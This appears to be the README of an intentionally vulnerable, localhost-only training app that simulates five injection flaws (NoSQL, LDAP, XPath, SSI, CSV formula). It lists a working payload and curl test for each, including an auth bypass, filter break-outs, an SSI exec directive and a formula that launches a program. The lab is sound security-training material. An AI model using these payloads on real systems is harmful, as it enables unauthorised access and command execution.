# InjectArena (Lab 09)

> **INTENTIONALLY VULNERABLE — localhost only.** This app exists to be exploited
> for security training. Every endpoint contains a deliberately planted injection
> bug. Bind is `127.0.0.1:18809` only. All secrets/salaries are **placeholder**
> (non-real) values. Do **not** deploy this anywhere reachable.

## What it is

InjectArena is an "injection range": a single stdlib-only Python file
(`http.server` + `json` + `re` + `xml.etree`) where each endpoint **simulates a
different backend query language** and is injectable. No real MongoDB / LDAP /
XPath / SSI / spreadsheet engine is required — the backends are simulated
faithfully enough that the injections genuinely change behavior, so you can
confirm each one with `curl`.

## How to run

```bash
python app.py
# -> [InjectArena] listening on http://127.0.0.1:18809/
```

Then browse `http://127.0.0.1:18809/` for a discoverable index of the attack
surface, or hit the endpoints directly (see the table below).

## Seeded users (in-memory)

| username | password         | email                     | salary  | role     | secret (placeholder)        |
|----------|------------------|---------------------------|---------|----------|-----------------------------|
| admin    | `S3cr3t-Admin!`  | admin@injectarena.local   | 999000  | admin    | PLACEHOLDER-FLAG-admin-7f3a |
| alice    | `alicepass123`   | alice@injectarena.local   | 82000   | engineer | PLACEHOLDER-FLAG-alice-2b9c |
| bob      | `bobby-bob`      | bob@injectarena.local     | 64000   | support  | PLACEHOLDER-FLAG-bob-1d4e   |
| carol    | `carolSecure!!`  | carol@injectarena.local   | 120000  | manager  | PLACEHOLDER-FLAG-carol-9a0f |

Feedback rows (for N5) start empty and accumulate via `POST /feedback`.

## Planted vulns

| ID | Name | Route | Example injection payload | Impact |
|----|------|-------|---------------------------|--------|
| **N1** | NoSQL injection (MongoDB) | `POST /login` (JSON body) | `{"username":"admin","password":{"$ne":null}}` | Auth bypass — operator object matches any non-null password; log in as admin without the password. |
| **N2** | LDAP injection | `GET /directory?user=` | `user=*)(uid=*))(|(uid=*` (or `user=*`) | Filter break-out — the concatenated `(&(objectClass=person)(uid=...))` filter opens up and returns **all** directory entries. |
| **N3** | XPath injection | `GET /employee?name=` | `name=x' or '1'='1` | Tautology break-out of the string literal in `//employee[name='...']` — predicate is always true, dumping **all** employees incl. salary/secret. |
| **N4** | SSI injection (server-side includes) | `GET /greet?name=` | `name=<!--#exec cmd="whoami"-->` | Injected SSI directive in the name is **processed** by the server (not output literally) — `exec cmd` runs an allow-listed command (RCE primitive); non-allow-listed cmds are intercepted but still shown as processed. |
| **N5** | CSV / formula injection | `POST /feedback` → `GET /export` | feedback `name==1+1` (or `=cmd|'/c calc'!A1`) | Stored value is written into a CSV cell with **no** formula-prefix sanitization (`= + - @ TAB CR`), so it becomes a live formula when the export is opened in Excel/Sheets. |

## Quick verification

```bash
# N1 - NoSQL auth bypass (returns authenticated:true, admin)
curl -s -d '{"username":"admin","password":{"$ne":null}}' http://127.0.0.1:18809/login
#   ...and a wrong string password fails:
curl -s -d '{"username":"admin","password":"wrong"}' http://127.0.0.1:18809/login

# N2 - LDAP filter break-out (all users vs one)
curl -s 'http://127.0.0.1:18809/directory?user=*)(uid=*))(|(uid=*'
curl -s 'http://127.0.0.1:18809/directory?user=alice'

# N3 - XPath tautology (all employees vs one)
curl -s "http://127.0.0.1:18809/employee?name=x' or '1'='1"
curl -s 'http://127.0.0.1:18809/employee?name=Alice'

# N4 - SSI directive processed (whoami output, not the literal directive)
curl -s 'http://127.0.0.1:18809/greet?name=<!--#exec cmd="whoami"-->'

# N5 - CSV/formula injection (cell starting with =1+1, unescaped)
curl -s -d 'name==1+1&comment=hi' http://127.0.0.1:18809/feedback
curl -s http://127.0.0.1:18809/export
```

## Notes on the simulation

- **N1** matches Mongo operators (`$ne`, `$gt`, `$gte`, `$lt`, `$lte`, `$regex`,
  `$in`, `$nin`, `$exists`, `$eq`) when a field value is a JSON object; a plain
  string/number is compared with exact equality (the safe path).
- **N2** parses an RFC-4515-ish filter; unbalanced/injected filters degrade to
  match-all, which is itself the injection signal. The raw built filter is
  echoed in the response.
- **N3** keeps users as an `xml.etree` document; the concatenated XPath is echoed
  and a tautology pattern forces an all-true predicate.
- **N4** only actually executes a read-only allow-list (`whoami`, `hostname`,
  `id`, `echo`, `ver`) for safety; anything else is reflected as
  `[ssi] directive processed (cmd intercepted for lab safety): <X>`. The point
  is that the directive is *processed server-side*, proving SSI injection.
- **N5** keeps minimal CSV quoting but never neutralizes formula prefixes, so the
  exported cell starts with the dangerous character.
